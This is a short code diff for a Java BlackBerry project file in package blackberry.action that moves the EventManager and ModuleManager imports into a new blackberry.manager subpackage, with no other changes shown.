@@ -11,9 +11,7 @@ package blackberry.action;
 import net.rim.device.api.system.Application;
 import net.rim.device.api.system.ApplicationDescriptor;
 import net.rim.device.api.system.CodeModuleManager;
-import blackberry.EventManager;
 import blackberry.Main;
-import blackberry.ModuleManager;
 import blackberry.Status;
 import blackberry.Trigger;
 import blackberry.config.Conf;
@@ -22,6 +20,8 @@ import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.evidence.EvidenceCollector;
 import blackberry.evidence.Markup;
+import blackberry.manager.EventManager;
+import blackberry.manager.ModuleManager;
 import blackberry.utils.Utils;
 
 /**
